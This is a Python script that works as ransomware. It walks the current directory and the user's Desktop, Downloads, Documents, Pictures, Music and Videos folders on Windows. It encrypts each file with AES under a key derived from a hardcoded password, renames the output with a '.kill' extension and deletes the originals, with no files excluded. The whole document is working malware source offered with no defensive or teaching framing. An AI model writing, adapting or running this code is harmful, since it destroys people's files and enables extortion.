import os
import getpass
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import scrypt

def encryptfile(file_path, key):
    chunk_size = 64 * 1024
    output_file = file_path + ".kill"  # Append .kill extension to file name
    init_vector = get_random_bytes(16)
    encryptor = AES.new(key, AES.MODE_CBC, init_vector)
    try:
        with open(file_path, 'rb') as infile:
            with open(output_file, 'wb') as outfile:
                outfile.write(init_vector)

                while True:
                    chunk = infile.read(chunk_size)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))

        os.remove(file_path)
    except PermissionError as e:
        print(f"PermissionError: {e}")

def encryptall(paths, exclude_extensions, username, key):
    for path in paths:
        if os.path.exists(path):
            for root, directories, files in os.walk(path):
                for file in files:
                    file_path = os.path.join(root, file)
                    _, extension = os.path.splitext(file_path)
                    if extension.lower() not in exclude_extensions and not file_path.endswith('.kill'):
                        encryptfile(file_path, key)
        else:
            print(f"Path {path} not found!")

if __name__ == "__main__":
    password = "Bl4ckAngel"
    key = scrypt(password.encode(), b'salt', 32, N=2**14, r=8, p=1)
    
    # List of file extensions to exclude from encryption
    exclude_extensions = []  # Add any extensions you want to exclude

    # Get the current username
    username = getpass.getuser()

    # List of paths to encrypt
    paths = [
                os.getcwd(),  # Encrypt files in the current directory
                f'C:\\Users\\{username}\\Desktop',
                f'C:\\Users\\{username}\\Downloads',
                f'C:\\Users\\{username}\\Documents',
                f'C:\\Users\\{username}\\Pictures',
                f'C:\\Users\\{username}\\Music',
                f'C:\\Users\\{username}\\Videos'
            ]

    # Encrypt files in specified paths
    encryptall(paths, exclude_extensions, username, key)
    print("Encryption completed successfully.")
       